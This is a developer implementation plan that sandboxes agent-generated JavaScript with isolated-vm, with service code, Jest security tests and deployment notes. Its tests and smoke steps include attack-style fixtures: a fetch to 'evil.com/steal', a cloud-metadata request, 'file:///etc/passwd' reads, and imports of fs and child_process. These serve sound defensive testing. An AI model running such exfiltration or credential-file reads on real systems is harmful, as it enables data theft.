# Sandbox Script Execution with `isolated-vm`

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Replace the unsandboxed `child_process.spawn()` script runner with a V8-isolate-based sandbox so agent-generated code cannot access the filesystem, spawn processes, or make unrestricted network requests.

**Architecture:** Agent-generated JavaScript currently runs in a bare Node.js child process that has full access to `fs`, `child_process`, `net`, and unrestricted `fetch()`. We replace `runInChildProcess()` in `ScriptExecutionService` with `runInIsolate()` using the `isolated-vm` npm package. The isolate gets only two bridged APIs: a domain-whitelisted `fetch()` and `console.log()`. Everything else (the `ScriptResult` return type, the `execute()` method signature, the DB persistence, the entity, the controller, the module wiring) stays identical.

**Tech Stack:** `isolated-vm` ^6.0.2 (V8 isolate), NestJS, Jest, Node 24

---

## Atomized Changes

| # | File | Action | Purpose |
|---|------|--------|---------|
| 1 | `backend/package.json` | Modify | Add `isolated-vm` ^6.0.2, add `NODE_OPTIONS=--no-node-snapshot` to scripts |
| 2 | `backend/src/modules/ai/services/script-execution.service.ts` | Modify | Replace `runInChildProcess` with `runInIsolate` using V8 sandbox; domain-whitelisted fetch bridge with redirect protection; concurrency semaphore |
| 3 | `backend/src/modules/ai/services/script-execution.service.spec.ts` | Create | Tests proving sandbox blocks `fs`/`child_process`/`net`, enforces domain + scheme allowlist, enforces CPU and async timeouts, enforces frozen env |

**What does NOT change:** `ScriptResult` interface, `execute()` signature, `listRuns()`, `ScriptRunEntity`, `AiService`, `AiController`, `AiModule`, tool definitions, prompts, frontend.

---

## Task 1: Install `isolated-vm` and configure Node flags

**Files:**
- Modify: `backend/package.json`

**Why ^6.0.2:** `isolated-vm` v5.x does not compile on Node 24 due to V8 API changes. Node 24 support landed in v6.0.0. Pin explicitly.

**Why `--no-node-snapshot`:** isolated-vm's [README](https://github.com/laverdet/isolated-vm/blob/main/README.md) states: "If you are using a version of nodejs >= 20.x you must pass `--no-node-snapshot` to node." Without it, isolates can misbehave at runtime in subtle ways due to the startup snapshot conflicting with V8 isolate creation.

**Step 1: Install the pinned version**

Run:
```bash
cd backend && npm install isolated-vm@^6.0.2
```

**Step 2: Add `NODE_OPTIONS` to package.json scripts**

In `backend/package.json`, update the `scripts` section — prefix `NODE_OPTIONS=--no-node-snapshot` to `start`, `start:dev`, and `start:prod`. For `test`, Jest inherits `NODE_OPTIONS` from the environment, so set it the same way:

```json
"scripts": {
  "build": "nest build",
  "start": "NODE_OPTIONS=--no-node-snapshot nest start",
  "start:dev": "NODE_OPTIONS=--no-node-snapshot nest start --watch",
  "start:prod": "NODE_OPTIONS=--no-node-snapshot node dist/main",
  "test": "NODE_OPTIONS=--no-node-snapshot jest",
  "test:watch": "NODE_OPTIONS=--no-node-snapshot jest --watch",
  "test:cov": "NODE_OPTIONS=--no-node-snapshot jest --coverage",
  ...rest unchanged...
}
```

**Step 3: Verify it installed and the native addon compiled**

Run:
```bash
cd backend && NODE_OPTIONS=--no-node-snapshot node -e "const ivm = require('isolated-vm'); const iso = new ivm.Isolate(); console.log('OK'); iso.dispose();"
```
Expected: `OK` (no errors — native addon built and isolate created successfully on Node 24)

**Step 4: Commit**

```bash
git add backend/package.json backend/package-lock.json
git commit -m "deps: add isolated-vm ^6.0.2, configure --no-node-snapshot for Node 24"
```

---

## Task 2: Rewrite `runInChildProcess` → `runInIsolate`

**Files:**
- Modify: `backend/src/modules/ai/services/script-execution.service.ts`

This is the core change. We replace the `spawn()`-based runner with a V8 isolate that has:
- A `console` global (captures to a log buffer)
- A `fetch()` global (bridges to host-side fetch with domain + scheme allowlist + redirect protection)
- `process.env` object with only the allowed API keys (frozen via `'use strict'` so mutations throw)
- 128MB memory limit per isolate, max 2 concurrent isolates (semaphore)
- 30s wall-clock timeout (wrapping the entire execution, including fetch waits)

### Design decisions baked into this code

**`'use strict';` in harness (issue #3):** Without strict mode, `Object.freeze` silently no-ops on mutation attempts. The harness prepends `'use strict';` so that `process.env.KEY = 'hacked'` throws a `TypeError` and the frozen-env test actually exercises the catch path.

**`redirect: 'error'` on fetch (issue #4a):** Node's `fetch()` follows redirects by default. An allowed domain returning `302 → evil.com` would bypass the allowlist. Setting `redirect: 'error'` causes the fetch to throw on any redirect. If agent code needs to follow redirects, it must do so manually and each hop gets re-validated.

**Scheme restriction (issue #6):** Only `https:` is allowed. Exception: `http:` is permitted for loopback addresses only (localhost/127.0.0.1) when `NODE_ENV !== 'production'`. This blocks protocol downgrade attacks and `file://` schemes.

**Loopback only in dev (issue #5):** In production on Cloud Run, `localhost` is the same container — scripts could hit internal admin routes. The allowlist only includes `localhost`/`127.0.0.1` when `NODE_ENV !== 'production'`. In prod, scripts use the real `API_URL` hostname (which the agent already has in `process.env.API_URL`).

**Concurrency semaphore (issue #9):** Each `ivm.Isolate({ memoryLimit: 128 })` reserves up to 128MB of V8 heap. Cloud Run default memory is 512MB. Three concurrent scripts could OOM the instance. A simple semaphore caps concurrent isolates at `MAX_CONCURRENT_ISOLATES = 2`. Excess callers await their turn.

**Async-executor pattern (issue #11):** The original used `async () =>` inside `new Promise(...)` — errors from the async body don't reject the outer promise. Refactored to a plain async function with the wall-clock timeout implemented via `AbortController` / `Promise.race` instead.

**`.copyInto()` usage (issue #7):** The fetch bridge returns `new ivm.ExternalCopy({...}).copyInto()` from the host callback. `copyInto()` returns a `Copy<T>` transferable marker that auto-deserializes when it crosses the isolate boundary as a Reference.apply return value. This is the [documented pattern](https://github.com/laverdet/isolated-vm#class-externalcopy-transferable) for host→isolate data transfer. **Verify at runtime in Task 4** — if the isolate receives `undefined` instead of the object, switch to returning the `ExternalCopy` directly and calling `.copy()` on the isolate side.

**Step 1: Rewrite the service**

Replace the full contents of `script-execution.service.ts` with:

```typescript
import { Injectable } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import * as ivm from 'isolated-vm';
import { ScriptRunEntity } from '../../../database/entities/script-run.entity';

const TIMEOUT_MS = 30_000;
const MAX_OUTPUT_BYTES = 100 * 1024; // 100KB
const MEMORY_LIMIT_MB = 128;
const MAX_CONCURRENT_ISOLATES = 2;

/**
 * Domains that agent scripts are allowed to fetch from.
 * Everything else is blocked at the bridge level.
 *
 * Maintenance: when adding support for a new blockchain API, add its
 * domain(s) here. Or set SCRIPT_ALLOWED_DOMAINS in the environment
 * (comma-separated) to extend the list without a code change.
 *
 * Accepted risk — DNS rebinding: an allowed domain could theoretically
 * rebind to an internal IP (e.g. 169.254.169.254) at fetch time. A full
 * fix requires resolving the hostname to an IP and checking against a
 * CIDR blocklist before connecting. Out of scope for v1; flagged as a
 * TODO for hardening before multi-tenant use.
 *
 * Accepted risk — API key exfiltration: ETHERSCAN_API_KEY and
 * TRONSCAN_API_KEY are intentionally exposed to agent scripts (they need
 * them to call those APIs). A malicious script could exfiltrate them via
 * a query string to a whitelisted domain that logs requests. These are
 * project-level keys with low blast radius (rate-limited, no billing
 * access). Acceptable for a single-user tool; revisit if opening to
 * external users.
 */
const BASE_ALLOWED_DOMAINS = [
  'api.etherscan.io',
  'api-sepolia.etherscan.io',
  'api-goerli.etherscan.io',
  'api-holesky.etherscan.io',
  'api.arbiscan.io',
  'api.basescan.org',
  'api-optimistic.etherscan.io',
  'api.polygonscan.com',
  'api.bscscan.com',
  'api.snowtrace.io',
  'api.ftmscan.com',
  'apilist.tronscanapi.com',
  'api.trongrid.io',
  'api.shasta.trongrid.io',
];

/** Loopback — only allowed in non-production for local API callbacks. */
const LOOPBACK_DOMAINS = ['localhost', '127.0.0.1'];

export interface ScriptResult {
  status: 'success' | 'error' | 'timeout';
  output: string;
  durationMs: number;
}

@Injectable()
export class ScriptExecutionService {
  private readonly allowedDomains: Set<string>;

  /** Simple semaphore: resolves in FIFO order when a slot frees up. */
  private running = 0;
  private readonly waitQueue: (() => void)[] = [];

  constructor(
    private readonly configService: ConfigService,
    @InjectRepository(ScriptRunEntity)
    private readonly scriptRunRepo: Repository<ScriptRunEntity>,
  ) {
    const extra = (this.configService.get<string>('SCRIPT_ALLOWED_DOMAINS') || '')
      .split(',')
      .map((d) => d.trim())
      .filter(Boolean);

    const isProd = this.configService.get<string>('NODE_ENV') === 'production';
    const loopback = isProd ? [] : LOOPBACK_DOMAINS;

    this.allowedDomains = new Set([...BASE_ALLOWED_DOMAINS, ...loopback, ...extra]);
  }

  async execute(
    investigationId: string,
    name: string,
    code: string,
  ): Promise<ScriptResult & { savedRun: ScriptRunEntity }> {
    const result = await this.runInIsolate(code);

    const savedRun = await this.scriptRunRepo.save(
      this.scriptRunRepo.create({
        investigationId,
        name,
        code,
        output: result.output,
        status: result.status,
        durationMs: result.durationMs,
      }),
    );

    return { ...result, savedRun };
  }

  async listRuns(investigationId: string): Promise<ScriptRunEntity[]> {
    return this.scriptRunRepo.find({
      where: { investigationId },
      order: { createdAt: 'DESC' },
      take: 20,
    });
  }

  // ---- Concurrency control ----

  private async acquireSlot(): Promise<void> {
    if (this.running < MAX_CONCURRENT_ISOLATES) {
      this.running++;
      return;
    }
    await new Promise<void>((resolve) => this.waitQueue.push(resolve));
    this.running++;
  }

  private releaseSlot(): void {
    this.running--;
    const next = this.waitQueue.shift();
    if (next) next();
  }

  // ---- URL validation ----

  /**
   * Check whether a URL is allowed: hostname in the allowlist AND scheme
   * is https (or http only for loopback in dev).
   */
  private isAllowedUrl(url: string): { allowed: boolean; reason?: string } {
    let parsed: URL;
    try {
      parsed = new URL(url);
    } catch {
      return { allowed: false, reason: 'Invalid URL' };
    }

    if (!this.allowedDomains.has(parsed.hostname)) {
      return { allowed: false, reason: `${parsed.hostname} is not in the allowed domain list` };
    }

    const isLoopback = LOOPBACK_DOMAINS.includes(parsed.hostname);
    if (parsed.protocol === 'https:') return { allowed: true };
    if (parsed.protocol === 'http:' && isLoopback) return { allowed: true };

    return {
      allowed: false,
      reason: isLoopback
        ? 'http is allowed for localhost only in development'
        : `Only https is allowed (got ${parsed.protocol})`,
    };
  }

  // ---- Isolate execution ----

  private async runInIsolate(code: string): Promise<ScriptResult> {
    await this.acquireSlot();
    const start = Date.now();
    const isolate = new ivm.Isolate({ memoryLimit: MEMORY_LIMIT_MB });

    try {
      return await this.executeInContext(isolate, code, start);
    } finally {
      if (!isolate.isDisposed) isolate.dispose();
      this.releaseSlot();
    }
  }

  private async executeInContext(
    isolate: ivm.Isolate,
    code: string,
    start: number,
  ): Promise<ScriptResult> {
    const logs: string[] = [];
    let totalLogBytes = 0;

    const appendLog = (...args: unknown[]) => {
      if (totalLogBytes > MAX_OUTPUT_BYTES) return;
      const line = args.map(String).join(' ');
      totalLogBytes += Buffer.byteLength(line) + 1;
      if (totalLogBytes > MAX_OUTPUT_BYTES) {
        logs.push('...[truncated at 100KB]');
      } else {
        logs.push(line);
      }
    };

    // Wall-clock timeout covering everything including async waits.
    // The eval() timeout only counts CPU time — a script doing
    // `await new Promise(r => setTimeout(r, 60_000))` via the bridge
    // would hang forever without this outer kill.
    const wallClockTimeout = new Promise<ScriptResult>((resolve) => {
      setTimeout(() => {
        if (!isolate.isDisposed) isolate.dispose();
        resolve({
          status: 'timeout',
          output: (logs.join('\n') + '\n...[killed: timeout after 30s]').trim(),
          durationMs: Date.now() - start,
        });
      }, TIMEOUT_MS);
    });

    const execution = (async (): Promise<ScriptResult> => {
      const context = await isolate.createContext();
      const jail = context.global;

      // --- Inject console.log ---
      await jail.set(
        '_log',
        new ivm.Callback((...args: unknown[]) => appendLog(...args)),
      );
      await context.eval(
        `globalThis.console = { log: _log, error: _log, warn: _log, info: _log };`,
      );

      // --- Inject process.env (read-only subset) ---
      const envObj: Record<string, string> = {};
      const ethKey = this.configService.get<string>('ETHERSCAN_API_KEY');
      const tronKey = this.configService.get<string>('TRONSCAN_API_KEY');
      const apiUrl = this.configService.get<string>('API_URL') || 'http://localhost:8081';
      if (ethKey) envObj.ETHERSCAN_API_KEY = ethKey;
      if (tronKey) envObj.TRONSCAN_API_KEY = tronKey;
      envObj.API_URL = apiUrl;

      await jail.set('_env', new ivm.ExternalCopy(envObj).copyInto());
      await context.eval(
        `globalThis.process = Object.freeze({ env: Object.freeze(_env) }); delete globalThis._env;`,
      );

      // --- Inject fetch bridge ---
      // Host-side: validates URL, enforces allowlist + scheme, blocks redirects.
      await jail.set(
        '_fetchBridge',
        new ivm.Reference(async (url: string, optsJson: string) => {
          const check = this.isAllowedUrl(url);
          if (!check.allowed) {
            return new ivm.ExternalCopy({
              ok: false,
              status: 403,
              body: `Blocked: ${check.reason}`,
            }).copyInto();
          }
          try {
            const opts = optsJson ? JSON.parse(optsJson) : {};
            // Force redirect: 'error' — an allowed domain that 302s to an
            // evil domain would bypass the allowlist. Scripts that need to
            // follow redirects must do so manually (each hop re-validated).
            opts.redirect = 'error';
            const res = await fetch(url, opts);
            const body = await res.text();
            return new ivm.ExternalCopy({
              ok: res.ok,
              status: res.status,
              body,
            }).copyInto();
          } catch (err: any) {
            const msg = err?.message ?? String(err);
            // Surface redirect errors clearly so the agent understands why
            const isRedirect = msg.includes('redirect');
            return new ivm.ExternalCopy({
              ok: false,
              status: isRedirect ? 301 : 0,
              body: isRedirect
                ? `Blocked: server returned a redirect (redirects are disabled for security)`
                : `Fetch error: ${msg}`,
            }).copyInto();
          }
        }),
      );

      await context.eval(`
        globalThis.fetch = async (url, opts = {}) => {
          const r = await _fetchBridge.apply(
            undefined,
            [String(url), JSON.stringify(opts)],
            { result: { promise: true } },
          );
          return {
            ok: r.ok,
            status: r.status,
            text: () => Promise.resolve(r.body),
            json: () => Promise.resolve(JSON.parse(r.body)),
          };
        };
        delete globalThis._fetchBridge;
      `);

      // --- Clean up injection helpers ---
      await context.eval(`delete globalThis._log;`);

      // --- Run agent code ---
      // 'use strict' is critical: without it, Object.freeze silently
      // no-ops on mutation attempts (sloppy mode). With it, assigning
      // to a frozen property throws TypeError.
      const harness = `
'use strict';
(async () => {
  try {
${code}
  } catch (err) {
    console.error(err?.message ?? String(err));
  }
})();
`.trim();

      await context.eval(harness, { timeout: TIMEOUT_MS, promise: true });

      return {
        status: 'success',
        output: logs.join('\n').trim(),
        durationMs: Date.now() - start,
      };
    })().catch((err: any) => {
      const msg = err?.message ?? String(err);
      const isTimeout =
        msg.includes('disposed') ||
        msg.includes('Script execution timed out');
      const existingOutput = logs.join('\n');
      return {
        status: (isTimeout ? 'timeout' : 'error') as ScriptResult['status'],
        output: existingOutput
          ? `${existingOutput}\n${msg}`.trim()
          : msg,
        durationMs: Date.now() - start,
      };
    });

    return Promise.race([execution, wallClockTimeout]);
  }
}
```

**Step 2: Verify backend compiles**

Run:
```bash
cd backend && npx tsc --noEmit
```
Expected: No errors.

**Step 3: Manual smoke test**

Run the backend (`npm run be`) and send a chat message that triggers `execute_script`. Verify:
- A simple `console.log("hello")` script works
- A fetch to Etherscan works
- Output appears in the scripts panel

**Step 4: Verify `.copyInto()` behavior at runtime**

In the browser console or via a test script, trigger a script that fetches from an allowed domain and logs the response. If the isolate receives `undefined` instead of `{ ok, status, body }`, the bridge return isn't crossing correctly. **Fallback:** remove `.copyInto()` from the three return sites in the bridge, return the `ExternalCopy` directly, and on the isolate side call `.copy()`:

```js
// Isolate-side fetch would become:
const raw = await _fetchBridge.apply(...);
const r = raw.copy();  // explicit copy from ExternalCopy
```

This fallback should not be needed — `copyInto()` is the [documented pattern](https://github.com/laverdet/isolated-vm#class-externalcopy-transferable) for cross-boundary returns — but verify before merge.

**Step 5: Commit**

```bash
git add backend/src/modules/ai/services/script-execution.service.ts
git commit -m "security: sandbox script execution with isolated-vm

Replace child_process.spawn with V8 isolate. Agent-generated code
now runs in an isolated V8 context with no access to fs, child_process,
net, os, or any Node.js API. Only a domain-whitelisted fetch() and
console.log are available.

Hardening: 'use strict' for frozen env enforcement, redirect: 'error'
on fetch to prevent allowlist bypass, https-only scheme restriction,
loopback restricted to dev, concurrency semaphore (max 2 isolates)."
```

---

## Task 3: Write tests proving the sandbox works

**Files:**
- Create: `backend/src/modules/ai/services/script-execution.service.spec.ts`

These tests validate the security properties of the sandbox — they are the proof that the isolation is real.

**Step 1: Write the test file**

```typescript
import { Test } from '@nestjs/testing';
import { ConfigService } from '@nestjs/config';
import { getRepositoryToken } from '@nestjs/typeorm';
import { ScriptExecutionService } from './script-execution.service';
import { ScriptRunEntity } from '../../../database/entities/script-run.entity';

const MAX_OUTPUT_BYTES = 100 * 1024;

const mockRepo = {
  find: jest.fn(),
  findOneBy: jest.fn(),
  create: jest.fn((dto) => dto),
  save: jest.fn((entity) => Promise.resolve({ id: 'run-1', ...entity })),
};

const mockConfig = {
  get: jest.fn((key: string) => {
    const env: Record<string, string> = {
      ETHERSCAN_API_KEY: 'test-eth-key',
      TRONSCAN_API_KEY: 'test-tron-key',
      API_URL: 'http://localhost:8081',
      NODE_ENV: 'development',
    };
    return env[key];
  }),
};

describe('ScriptExecutionService (sandbox)', () => {
  let service: ScriptExecutionService;

  beforeEach(async () => {
    jest.clearAllMocks();

    const module = await Test.createTestingModule({
      providers: [
        ScriptExecutionService,
        { provide: getRepositoryToken(ScriptRunEntity), useValue: mockRepo },
        { provide: ConfigService, useValue: mockConfig },
      ],
    }).compile();

    service = module.get(ScriptExecutionService);
  });

  // --- Basic execution ---

  it('runs simple console.log and captures output', async () => {
    const { status, output } = await service.execute('inv-1', 'test', 'console.log("hello world");');
    expect(status).toBe('success');
    expect(output).toContain('hello world');
  });

  it('captures multiple console.log calls', async () => {
    const code = `
      console.log("line 1");
      console.log("line 2");
      console.log("line 3");
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('line 1');
    expect(output).toContain('line 2');
    expect(output).toContain('line 3');
  });

  it('returns error status when code throws', async () => {
    const { status, output } = await service.execute(
      'inv-1',
      'test',
      'throw new Error("boom");',
    );
    expect(status).toBe('error');
    expect(output).toContain('boom');
  });

  // --- Sandbox isolation ---

  it('blocks fs access', async () => {
    const code = `
      try {
        const fs = await import('fs');
        console.log("ESCAPED: fs loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks child_process access', async () => {
    const code = `
      try {
        const cp = await import('child_process');
        console.log("ESCAPED: child_process loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks net access', async () => {
    const code = `
      try {
        const net = await import('net');
        console.log("ESCAPED: net loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks os access', async () => {
    const code = `
      try {
        const os = await import('os');
        console.log("ESCAPED: os loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('has no access to require()', async () => {
    const code = `
      try {
        const m = require('fs');
        console.log("ESCAPED: require exists");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  // --- process.env ---

  it('exposes only whitelisted env vars', async () => {
    const code = `
      console.log("ETH:" + process.env.ETHERSCAN_API_KEY);
      console.log("TRON:" + process.env.TRONSCAN_API_KEY);
      console.log("API:" + process.env.API_URL);
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('ETH:test-eth-key');
    expect(output).toContain('TRON:test-tron-key');
    expect(output).toContain('API:http://localhost:8081');
  });

  it('does not expose HOME, PATH, or other system env vars', async () => {
    const code = `
      console.log("HOME:" + (process.env.HOME || "undefined"));
      console.log("PATH:" + (process.env.PATH || "undefined"));
      console.log("DATABASE_URL:" + (process.env.DATABASE_URL || "undefined"));
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('HOME:undefined');
    expect(output).toContain('PATH:undefined');
    expect(output).toContain('DATABASE_URL:undefined');
  });

  it('process.env is frozen — mutation throws in strict mode', async () => {
    const code = `
      try {
        process.env.ETHERSCAN_API_KEY = "hacked";
        console.log("MUTATED");
      } catch (e) {
        console.log("FROZEN: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('FROZEN');
    expect(output).not.toContain('MUTATED');
  });

  // --- Fetch domain whitelist ---

  it('blocks fetch to non-whitelisted domains', async () => {
    const code = `
      const res = await fetch("https://evil.com/steal");
      const body = await res.text();
      console.log("status:" + res.status);
      console.log("body:" + body);
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('status:403');
    expect(output).toContain('Blocked');
  });

  it('blocks fetch to cloud metadata endpoint', async () => {
    const code = `
      const res = await fetch("http://169.254.169.254/latest/meta-data/");
      console.log("status:" + res.status);
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('status:403');
  });

  it('blocks http scheme on non-loopback domains', async () => {
    const code = `
      const res = await fetch("http://api.etherscan.io/api?module=account");
      console.log("status:" + res.status);
      console.log("body:" + await res.text());
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('status:403');
    expect(output).toContain('Only https');
  });

  it('blocks file:// scheme', async () => {
    const code = `
      const res = await fetch("file:///etc/passwd");
      console.log("status:" + res.status);
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('status:403');
  });

  // --- Timeout ---

  it('kills scripts that exceed the CPU timeout', async () => {
    const code = `
      while (true) {
        // infinite CPU loop
      }
    `;
    const { status } = await service.execute('inv-1', 'test', code);
    expect(status).toBe('timeout');
  }, 35_000);

  it('kills scripts that stall on async operations (wall-clock timeout)', async () => {
    // This tests the wall-clock timeout wrapper, NOT the eval() CPU timeout.
    // A script awaiting a host-side promise that never resolves would hang
    // forever without the outer setTimeout kill.
    const code = `
      await new Promise(resolve => {
        // never resolves — simulates a hung fetch or infinite sleep
      });
    `;
    const { status } = await service.execute('inv-1', 'test', code);
    expect(status).toBe('timeout');
  }, 35_000);

  // --- Output limit ---

  it('truncates output exceeding 100KB', async () => {
    const code = `
      for (let i = 0; i < 50000; i++) {
        console.log("x".repeat(100));
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('[truncated at 100KB]');
    expect(Buffer.byteLength(output)).toBeLessThanOrEqual(MAX_OUTPUT_BYTES + 200);
  });

  // --- DB persistence ---

  it('saves script run to database', async () => {
    await service.execute('inv-1', 'my-script', 'console.log("saved");');
    expect(mockRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        investigationId: 'inv-1',
        name: 'my-script',
        code: 'console.log("saved");',
        status: 'success',
      }),
    );
    expect(mockRepo.save).toHaveBeenCalled();
  });
});
```

**Step 2: Run the tests**

Run:
```bash
cd backend && npm test -- src/modules/ai/services/script-execution.service.spec.ts --verbose
```
Expected: All tests pass. The critical ones:
- "blocks fs/child_process/net/os" — proves the sandbox is real
- "process.env is frozen — mutation throws" — proves `'use strict'` works
- "blocks http scheme on non-loopback" — proves scheme restriction
- "kills scripts that stall on async operations" — proves wall-clock timeout (not just CPU timeout)

**Step 3: Commit**

```bash
git add backend/src/modules/ai/services/script-execution.service.spec.ts
git commit -m "test: prove sandbox blocks fs, child_process, net, os; enforces domain + scheme allowlist, CPU + async timeouts, frozen env"
```

---

## Task 4: End-to-end smoke test

This is a manual verification that the full agent loop works with the new sandbox.

**Step 1: Start the backend**

Run:
```bash
npm run be
```

**Step 2: Test via the UI**

Open the app, go to an investigation, and send a message like:
> "What is the ETH balance of vitalik.eth?"

Verify:
- The agent calls `get_skill` to load blockchain-apis
- The agent calls `execute_script` with a fetch to Etherscan
- The script succeeds and returns data
- The result appears in the chat and scripts panel

**Step 3: Verify `.copyInto()` bridge works**

The fetch bridge returns `new ivm.ExternalCopy({...}).copyInto()`. If the agent's script gets `undefined` instead of the response object, the bridge needs the fallback described in Task 2 Step 4.

**Step 4: Test a blocked script via rerun**

Find a completed script run and edit its code in the DB (or create a test endpoint) to try:
```js
const fs = await import('fs');
console.log(fs.readFileSync('/etc/passwd', 'utf-8'));
```

Verify it returns an error, not the file contents.

---

## Notes

### What this changes
- **One file modified:** `script-execution.service.ts` — `runInChildProcess` → `runInIsolate`
- **One file modified:** `package.json` — add `isolated-vm`, add `--no-node-snapshot` to scripts
- **One file created:** `script-execution.service.spec.ts` — sandbox proof tests

### What this does NOT change
- `ScriptResult` interface — identical
- `execute()` / `listRuns()` method signatures — identical
- `ScriptRunEntity` — identical
- `AiService` tool dispatch — identical
- `AiController` rerun endpoint — identical
- `AiModule` wiring — identical
- Frontend — identical
- Agent prompts / tool descriptions — identical

### Domain allowlist maintenance
The `BASE_ALLOWED_DOMAINS` array is the default. Extend without code changes via `SCRIPT_ALLOWED_DOMAINS` env var (comma-separated). When adding a new blockchain API, either add to the array or to the env var.

### Accepted risks (documented, not deferred)

**DNS rebinding (issue #4b):** An allowed domain could rebind its DNS to an internal IP (e.g. 169.254.169.254). Full mitigation requires resolving hostname → IP before connecting and checking against a CIDR blocklist. Out of scope for v1 single-user deployment. Revisit before multi-tenant.

**API key exfiltration (issue #13):** `ETHERSCAN_API_KEY` and `TRONSCAN_API_KEY` are intentionally in the isolate. A malicious script could exfiltrate them via query strings to a whitelisted domain. These are project-level keys with low blast radius. Acceptable for single-user; revisit for multi-tenant (per-user keys or a proxy layer).

### Production deployment notes
- Cloud Run: set `NODE_OPTIONS=--no-node-snapshot` as an environment variable (or in the `CMD` of the Dockerfile)
- Cloud Run default memory is 512MB. With `MAX_CONCURRENT_ISOLATES = 2` and `MEMORY_LIMIT_MB = 128`, worst-case isolate memory is 256MB — leaves ~256MB for the NestJS process. If you increase Cloud Run memory, consider raising `MAX_CONCURRENT_ISOLATES` proportionally.
